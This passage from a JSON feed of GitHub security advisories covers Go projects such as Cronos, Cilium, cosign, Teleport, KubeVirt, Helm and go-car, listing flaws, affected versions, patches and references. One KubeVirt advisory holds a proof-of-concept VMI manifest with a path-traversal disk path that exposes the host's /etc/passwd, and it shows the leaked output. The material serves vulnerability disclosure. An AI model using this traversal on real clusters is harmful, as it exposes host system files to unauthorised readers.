"ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35936"}, {"type": "WEB", "url": "https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451"}, {"type": "PACKAGE", "url": "https://github.com/evmos/ethermint"}, {"type": "WEB", "url": "https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203"}], "database_specific": {"cwe_ids": ["CWE-668"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-08-18T19:04:47Z", "nvd_published_at": "2022-08-05T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gwj5-wp6r-5q9f", "modified": "2022-08-11T18:08:57Z", "published": "2022-08-11T18:08:57Z", "aliases": [], "summary": "Cronos vulnerable to DoS through unintended Contract Selfdestruct", "details": "In Cronos nodes running versions before v0.7.0, the contract selfdestruct invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in Ethermint, all contracts that used the identical bytecode (i.e shared the same CodeHash) will also stop working once one contract invokes selfdestruct, even though the other contracts did not invoke the selfdestruct OPCODE. Thanks to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. This problem has been patched in Cronos v0.8.0. The patch has state machine-breaking changes and the required coordinated network upgrade was done on the block height 3982500 on the Cronos mainnet beta network. If a contract is subject to DoS due to this issue, the user can redeploy the same contract, i.e with identical bytecode, so that the original contract's code is recovered.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crypto-org-chain/cronos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.7.0"}}], "references": [{"type": "WEB", "url": "https://github.com/crypto-org-chain/cronos/security/advisories/GHSA-gwj5-wp6r-5q9f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35936"}, {"type": "WEB", "url": "https://github.com/crypto-org-chain/cronos/commit/2f2cc88b501b47149690fdef05afbbbe5bc116c9"}, {"type": "PACKAGE", "url": "https://github.com/crypto-org-chain/cronos"}], "database_specific": {"cwe_ids": ["CWE-668"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-08-11T18:08:57Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-pfhr-pccp-hwmh", "modified": "2022-08-30T20:06:02Z", "published": "2022-08-30T20:06:02Z", "aliases": [], "summary": "Network Policies & (Clusterwide) Cilium Network Policies with namespace label selectors may unexpectedly select pods with maliciously crafted labels", "details": "### Impact\n\nIf a user has Network Policies with namespace selectors selecting labels of namespaces, or (clusterwide) Cilium Network Policies matching on namespace labels, then it is possible for an attacker with Kubernetes pod deploy rights (either directly or indirectly via higher-level APIs such as Deployment, Daemonset etc) to craft additional pod labels such that the pod is selected by another policy that exists rather than the expected policy. \n\n### Patches\n\nThe problem has been fixed and is available on versions >=1.10.14, >=1.11.8, >=1.12.1\n\n### Workarounds\n\nThere are no workarounds available.\n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Sander Mathijssen for not only highlighting the issue but also proposing a resolution. \n\n### For more information\n\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.14"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.10.13"}}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.11.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.1"}]}], "versions": ["1.12.0"]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-pfhr-pccp-hwmh"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.10.14"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.11.8"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.12.1"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-08-30T20:06:02Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-739f-hw6h-7wq8", "modified": "2022-08-10T18:38:16Z", "published": "2022-08-10T18:38:16Z", "aliases": ["CVE-2022-35930"], "summary": "PolicyController before 0.2.1 may bypass attestation verification", "details": "PolicyController will report a false positive, resulting in an admission when it should not be admitted when:\n * There is at least one attestation with a valid signature\n * There are NO attestations of the type being verified (--type defaults to \"custom\")\n\nUsers should upgrade to cosign version 0.2.1 or greater for a patch. There are no known workarounds at this time.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sigstore/policy-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sigstore/policy-controller/security/advisories/GHSA-739f-hw6h-7wq8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35930"}, {"type": "WEB", "url": "https://github.com/sigstore/policy-controller/commit/e852af36fb7d42678b21d7e97503c25bd1fd05c8"}, {"type": "PACKAGE", "url": "https://github.com/sigstore/policy-controller"}, {"type": "WEB", "url": "https://github.com/sigstore/policy-controller/releases/tag/v0.2.1"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-08-10T18:38:16Z", "nvd_published_at": "2022-08-04T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8449-7gc2-pwrp", "modified": "2022-09-08T14:07:19Z", "published": "2022-08-18T00:00:17Z", "aliases": ["CVE-2022-38149"], "summary": "HashiCorp Consul Template could reveal Vault secret contents in error messages", "details": "In HashiCorp Consul Template through version 0.29.1, invalid templates could inadvertently reveal the contents of Vault secret in errors returned by the `*template.Template.Execute 5` method, when given a template using Vault secret contents incorrectly. This method has been updated to redact Vault secrets when creating an error string, making it safe to log the error.. This issue was fixed in version 0.29.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul-template"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.27.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul-template"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.28.0"}, {"fixed": "0.28.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul-template"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.29.0"}, {"fixed": "0.29.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-38149"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul-template/commit/d6a6f4af219c28e67d847ba0e0b2bea8f5bb9076"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hsec-2022-16-consul-template-may-expose-vault-secrets-when-processing-invalid-input/43215"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0980"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-08-30T20:17:03Z", "nvd_published_at": "2022-08-17T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6xf3-5hp7-xqqg", "modified": "2022-09-27T08:28:17Z", "published": "2022-08-25T00:00:28Z", "aliases": ["CVE-2022-36633"], "summary": "Improper token validation leading to code execution in Teleport", "details": "Teleport 9.3.6 is vulnerable to Command injection leading to Remote Code Execution. An attacker can craft a malicious ssh agent installation link by URL encoding a bash escape with carriage return line feed. This url encoded payload can be used in place of a token and sent to a user in a social engineering attack. This is fully unauthenticated attack utilizing the trusted teleport server to deliver the payload.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gravitational/teleport"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.3.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/gravitational/teleport"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.3.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/gravitational/teleport"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "10.0.0"}, {"fixed": "10.1.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36633"}, {"type": "WEB", "url": "https://github.com/gravitational/teleport/pull/14726"}, {"type": "WEB", "url": "https://github.com/gravitational/teleport/pull/14726/commits/46c23b9b64b944d1e82d2c8a79083f291ffdd3b6"}, {"type": "PACKAGE", "url": "https://github.com/gravitational/teleport"}, {"type": "WEB", "url": "https://github.com/gravitational/teleport/releases/tag/v10.1.2"}, {"type": "WEB", "url": "https://github.com/gravitational/teleport/releases/tag/v8.3.17"}, {"type": "WEB", "url": "https://github.com/gravitational/teleport/releases/tag/v9.3.13"}, {"type": "WEB", "url": "https://packetstormsecurity.com/files/168137/Teleport-9.3.6-Command-Injection.html"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/168477/Teleport-10.1.1-Remote-Code-Execution.html"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-77"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-08-30T20:53:54Z", "nvd_published_at": "2022-08-24T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cvx8-ppmc-78hm", "modified": "2022-09-30T00:44:46Z", "published": "2022-08-18T19:02:18Z", "withdrawn": "2022-09-30T00:44:46Z", "aliases": ["CVE-2022-1798"], "summary": "Duplicate Advisory: KubeVirt arbitrary host file read from the VM", "details": "## Duplicate Advisory\nThis advisory is a duplicate of [GHSA-qv98-3369-g364](https://github.com/advisories/GHSA-qv98-3369-g364). This link is maintained to preserve external references.\n\n## Original Description\n\n**Summary**\nAs part of a Kubevirt audit performed by NCC group, a finding dealing with systemic lack of path sanitization which leads to a path traversal was identified.  Google tested the exploitability of the paths in the audit report and identified that when combined with another vulnerability one of the paths leads to an arbitrary file read on the host from the VM.\n\nThe read operations are limited to files which are publicly readable or which are readable for UID 107 or GID 107. /proc/self/<> is not accessible.\n\n**Severity**\n\nModerate - The vulnerability is proven to exist in an open source version of KubeVirt by NCC Group while being combined with Systemic Lack of Path Sanitization, which leads to Path traversal.\n\n**Proof of Concept**\n\nThe initial VMI specifications can be written as such to reproduce the issue:\n\n```\n\napiVersion: kubevirt.io/v1\nkind: VirtualMachineInstance\nmetadata:\n  name: vmi-fedora\nspec:\n  domain:\n    devices:\n      disks:\n      - disk:\n          bus: virtio\n        name: containerdisk\n      - disk:\n          bus: virtio\n        name: cloudinitdisk\n      - disk:\n          bus: virtio\n        name: containerdisk1\n      rng: {}\n    resources:\n      requests:\n        memory: 1024M\n  terminationGracePeriodSeconds: 0\n  volumes:\n  - containerDisk:\n      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0\n    name: containerdisk\n  - containerDisk:\n      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0\n      path: test3/../../../../../../../../etc/passwd\n    name: containerdisk1\n  - cloudInitNoCloud:\n      userData: |\n        #!/bin/sh\n        echo 'just something to make cirros happy'\n    name: cloudinitdisk\n\n\n```\nThe VMI can then be started through kubectl apply -f vm-test-ncc.yaml.\nThe requested file is accessible once the VM is up and can be accessed under /dev/vdc.\n\nDepending on the environment, path may contain more or less /.., something that can easily be tested by checking the events until the VMI can start without failure.\nRestrictions \n\nSELinux may mitigate this vulnerability.\n\nWhen using a node with selinux, selinux denies the access and the VM start was aborted:\n\n```\n\n19s         Warning   SyncFailed                virtualmachineinstance/vmi-fedora    server error. command SyncVMI failed: \"preparing ephemeral container disk images failed: stat /var/run/kubevirt/container-disks/disk_0.img: permission denied\"\n\ntype=AVC msg=audit(1651828898.296:1266): avc:  denied  { setattr } for  pid=44402 comm=\"rpc-worker\" name=\"passwd\" dev=\"vda1\" ino=691477 scontext=system_u:system_r:virt_launcher.process:s0:c255,c849 tcontext=system_u:object_r:passwd_file_t:s0 tclass=file permissive=1\n\n```\n\nAfter making selinux permissive the VM can boot and access /etc/passwd from the node within the guest:\n\n```\n\n$ sudo cat /dev/vdc\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n[...]\n\n```\n\n**Further Analysis**\nIn order to mitigate this vulnerability, Sanitize imagePath in pkg/container-disk/container-disk.go following ISE best practices described and Add checks in pkg/virt-api/webhooks/validating-webhook/admitters/vmi-create-admitter.go\n\n**Timeline**\nDate reported: 05/10/2022\nDate fixed: N/A\nDate disclosed: 08/08/2022", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "kubevirt.io/kubevirt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.20.0"}, {"fixed": "0.55.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm"}, {"type": "WEB", "url": "https://github.com/kubevirt/kubevirt/security/advisories/GHSA-qv98-3369-g364"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1798"}, {"type": "PACKAGE", "url": "https://github.com/kubevirt/kubevirt"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-08-18T19:02:18Z", "nvd_published_at": "2022-09-15T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h3qm-jrrf-cgj3", "modified": "2023-02-09T20:23:23Z", "published": "2022-08-02T00:00:20Z", "aliases": ["CVE-2022-37315"], "summary": "graphql-go has infinite recursion in the type definition parser", "details": "graphql-go (aka GraphQL for Go) through 0.8.0 has infinite recursion in the type definition parser.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/graphql-go/graphql"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.8.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-37315"}, {"type": "WEB", "url": "https://github.com/graphql-go/graphql/issues/637"}, {"type": "WEB", "url": "https://github.com/graphql-go/graphql/pull/642"}, {"type": "WEB", "url": "https://github.com/graphql-go/graphql/pull/642/commits/4188bd5b3877f7badb951b421cf66e0af2eacb22"}, {"type": "PACKAGE", "url": "https://github.com/graphql-go/graphql"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0942"}], "database_specific": {"cwe_ids": ["CWE-674"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-08-10T15:43:18Z", "nvd_published_at": "2022-08-01T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rqmg-hrg4-fm69", "modified": "2022-08-15T20:02:22Z", "published": "2022-08-06T00:00:36Z", "aliases": ["CVE-2022-37450"], "summary": "Go Ethereum allows attackers to use manipulation of time-difference values to achieve replacement of main-chain blocks", "details": "Go Ethereum (aka geth) through 1.10.21 allows attackers to increase rewards by mining blocks in certain situations, and using a manipulation of time-difference values to achieve replacement of main-chain blocks, aka Riskless Uncle Making (RUM), as exploited in the wild in 2020 through 2022.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.10.21"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-37450"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/blob/671094279e8d27f4b4c3c94bf8b636c26b473976/core/forkchoice.go#L91-L94"}, {"type": "WEB", "url": "https://medium.com/@aviv.yaish/uncle-maker-time-stamping-out-the-competition-in-ethereum-d27c1cb62fef"}, {"type": "WEB", "url": "https://news.ycombinator.com/item?id=32354896"}, {"type": "WEB", "url": "http://dx.doi.org/10.13140/RG.2.2.27813.99043"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-08-11T16:51:45Z", "nvd_published_at": "2022-08-05T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-grvv-h2f9-7v9c", "modified": "2022-08-30T19:54:34Z", "published": "2022-08-30T19:54:34Z", "aliases": ["CVE-2022-36009"], "summary": "gomatrixserverlib and Dendrite vulnerable to incorrect parsing of the event default power level in event auth", "details": "### Impact\n\nThe power level parsing within gomatrixserverlib was failing to parse the `\"events_default\"` key of the `m.room.power_levels` event, defaulting the event default power level to zero in all cases.\n\nIn rooms where the `\"events_default\"` power level had been changed, this could result in events either being incorrectly authorised or rejected by Dendrite servers.\n\n### Patches\n\ngomatrixserverlib contains a fix as of commit `723fd49` and Dendrite 0.9.3 has been updated accordingly.\n\n### Workarounds\n\nMatrix rooms where the `\"events_default\"` power level has not been changed from the default of zero are not vulnerable.\n\n### For more information\n\nIf you have any questions or comments about this advisory, e-mail us at [security@matrix.org](mailto:security@matrix.org).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/matrix-org/dendrite"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/matrix-org/gomatrixserverlib"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20220815091947-723fd495dde8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/matrix-org/gomatrixserverlib/security/advisories/GHSA-grvv-h2f9-7v9c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36009"}, {"type": "WEB", "url": "https://github.com/matrix-org/gomatrixserverlib/commit/723fd495dde835d078b9f2074b6b62c06dea4575"}, {"type": "PACKAGE", "url": "https://github.com/matrix-org/gomatrixserverlib"}, {"type": "WEB", "url": "https://matrix.org/docs/guides/moderation/#power-levels"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0952"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-08-30T19:54:34Z", "nvd_published_at": "2022-08-19T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c8fj-4pm8-mp2c", "modified": "2022-08-30T20:54:28Z", "published": "2022-08-30T20:54:28Z", "aliases": ["CVE-2022-36051"], "summary": "Broken Authorization in ZITADEL Actions", "details": "### Impact\n\n**Actions**, introduced in ZITADEL **1.42.0** on the API and **1.56.0** for Console, is a feature, where users with role `ORG_OWNER` are able to create Javascript Code, which is invoked by the system at certain points during the login.\n**Actions**, for example, allow creating authorizations (user grants) on newly created users programmatically.\nDue to a missing authorization check, **Actions** were able to grant authorizations for projects that belong to other organisations inside the same Instance. Granting authorizations via API and Console is not affected by this vulnerability.\n\n### Patches\n\n2.x versions are fixed on >= [2.2.0](https://github.com/zitadel/zitadel/releases/tag/v2.2.0)\n1.x versions are fixed on >= [1.87.1](https://github.com/zitadel/zitadel/releases/tag/v1.87.1)\n\nZITADEL recommends upgrading to the latest versions available in due course.\n\n### Workarounds\n\nThere is no workaround since a patch is already available.\n\n### Who did disclose this\n\nDuring our recurring white box penetration test our external security consultant found this issue.\nThe full report will be made public after the complete review.\n\n### References\n\nhttps://docs.zitadel.com/docs/guides/manage/customize/behavior\nhttps://docs.zitadel.com/docs/apis/actions\nhttps://zitadel.com/blog/pentest-results-h1-2021\n\n### Questions\n\nIf you have any questions or comments about this advisory:\n* Email us at [security@zitadel.com](mailto:security@zitadel.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.2.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.42.0"}, {"fixed": "1.87.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/zitadel/zitadel/security/advisories/GHSA-c8fj-4pm8-mp2c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36051"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/pull/4237"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/pull/4238"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/releases/tag/v1.87.1"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/releases/tag/v2.2.0"}, {"type": "PACKAGE", "url": "github.com/zitadel/zitadel"}], "database_specific": {"cwe_ids": ["CWE-436", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-08-30T20:54:28Z", "nvd_published_at": "2022-08-31T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vjxv-45g9-9296", "modified": "2022-08-10T18:40:38Z", "published": "2022-08-10T18:40:38Z", "aliases": ["CVE-2022-35929"], "summary": "cosign's `cosign verify-attestaton  --type` can report a false positive if any attestation exists", "details": "`cosign verify-attestation` used with the `--type` flag will report a false positive verification when:\n\n- There is at least one attestation with a valid signature\n- There are NO attestations of the type being verified (--type defaults to \"custom\")\n\nThis can happen when signing with a standard keypair and with \"keyless\" signing with Fulcio. Users should upgrade to cosign version 1.10.1 or greater for a patch. Currently the only workaround is to upgrade.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sigstore/cosign"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sigstore/cosign/security/advisories/GHSA-vjxv-45g9-9296"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35929"}, {"type": "WEB", "url": "https://github.com/sigstore/cosign/commit/c5fda01a8ff33ca981f45a9f13e7fb6bd2080b94"}, {"type": "PACKAGE", "url": "https://github.com/sigstore/cosign"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-08-10T18:40:38Z", "nvd_published_at": "2022-08-04T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7hfp-qfw3-5jxh", "modified": "2023-08-30T18:43:09Z", "published": "2022-08-30T20:52:31Z", "aliases": ["CVE-2022-36055"], "summary": "Helm Vulnerable to denial of service through string value parsing", "details": "Fuzz testing, by Ada Logics and sponsored by the CNCF, identified input to functions in the `_strvals_` package that can cause an out of memory panic. Out of memory panics cannot be recovered from. Applications that use functions from the `_strvals_` package in the Helm SDK can have a Denial of Service attack when they use this package and it panics.\n\n### Impact\n\nThe `_strvals_` package contains a parser that turns strings into Go structures. For example, the Helm client has command line flags like `--set`, `--set-string`, and others that enable the user to pass in strings that are merged into the values. The `_strvals_` package converts these strings into structures Go can work with. Some string inputs can cause array data structures to be created causing an out of memory panic.\n\nApplications that use the `_strvals_` package in the Helm SDK to parse user supplied input can suffer a Denial of Service when that input causes a panic that cannot be recovered from.\n\nThe Helm Client will panic with input to `--set`, `--set-string`, and other value setting flags that causes an out of memory panic. Helm is not a long running service so the panic will not affect future uses of the Helm client.\n\n### Patches\n\nThis issue has been resolved in 3.9.4. \n\n### Workarounds\n\nSDK users can validate strings supplied by users won't create large arrays causing significant memory usage before passing them to the `_strvals_` functions.\n\n### For more information\n\nHelm's security policy is spelled out in detail in our [SECURITY](https://github.com/helm/community/blob/master/SECURITY.md) document.\n\n### Credits\n\nDisclosed by Ada Logics in a fuzzing audit sponsored by CNCF.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.9.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-7hfp-qfw3-5jxh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36055"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/10466e3e179cc8cad4b0bb451108d3c442c69fbc"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://github.com/helm/helm/releases/tag/v3.9.4"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0962"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-08-30T20:52:31Z", "nvd_published_at": "2022-09-01T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9x4h-8wgm-8xfg", "modified": "2022-07-06T19:26:17Z", "published": "2022-07-06T19:26:17Z", "aliases": [], "summary": "Malformed CAR panics and excessive memory usage", "details": "### Impact\n\n**Versions impacted**\n  * `<=` go-car@v0.3.3\n  * `<=` go-car@v2.3.0\n\n**Description**\n\nDecoding CAR data from untrusted user input can cause:\n\n- Panics:\n  - Out of bound memory access\n  - Out of memory\n  - Divide by zero\n- Excessive memory usage\n\nSuch panics can be triggered by intentionally malformed CARv1 data, including CARv1 data within a CARv2 container; and also CARv2 data with excessively large indexes.\n\nThese vulnerabilities are not known to be exploited in the wild and were discovered primarily with the use of code fuzzing tooling.\n\n**Details**\n\n**Out of bound memory access** (OOB), **out of memory** (OOM) panics or **excessive memory usage** can be triggered by decode of malformed CARv1 headers, malformed CARv1 sections, and malformed CIDv0 data used in CARv1 sections. This also applies to CARv1 data within a CARv2 container.\n\nAdditionally, we wish to use this security advisory to make clear to consumers of CARv2 format data that **loading CARv2 indexes from untrusted sources is dangerous and should be avoided**. Where CAR data indexes are required, they should be regenerated locally. Out of memory (OOM) panics or excessive memory usage can be triggered by decode of intentionally malformed CARv2 indexes, or CARv2 indexes which are larger than available system memory (i.e. parallelization of CARv2 decodes may increase such a vulnerability).\n\n### Patches\n\n**Fixed versions**\n\n* `>=` go-car@v0.4.0\n* `>=` go-car@v2.4.0\n\n**Description of user-facing changes**\n\n***go-car@v0.4.0*** imposes a fixed maximum header length and section length of 32 MiB during decode. Headers exceeding this length will cause the decoder to return an error as the initial CAR decode occurs. Sections (the combination of CID and block data) exceeding this length will cause the decoder to return an error as that section is read.\n\nThe default maximum of 32 MiB may be changed _globally_ in an application instance by directly changing the `MaxAllowedSectionSize` variable in the `github.com/ipld/go-car/util` package.\n\nWe recommend that users of go-car@v0 upgrade to go-car@v2, where these maximums may be applied per-decode rather than globally.\n\n***go-car@v2.4.0*** imposes a default maximum header length of 32 MiB and a default maximum section length of 8 MiB. Headers exceeding this length will cause the decoder to return an error as the initial CAR decode occurs. Sections (the combination of CID and block data) exceeding this length will cause the decoder to return an error as that section is read.\n\nThe default values may be adjusted by supplying a `MaxAllowedHeaderSize(x)` or `MaxAllowedSectionSize(y)` option to any decode function that accepts options. These include:\n\n* `OpenReader()`\n* `NewReader()`\n* `NewBlockReader()`\n* `ReadVersion()`\n* `LoadIndex()`\n* `GenerateIndex()`\n* `ReadOrGenerateIndex()`\n* `WrapV1()`\n* `ExtractV1File()`\n* `ReplaceRootsInFile()`\n* 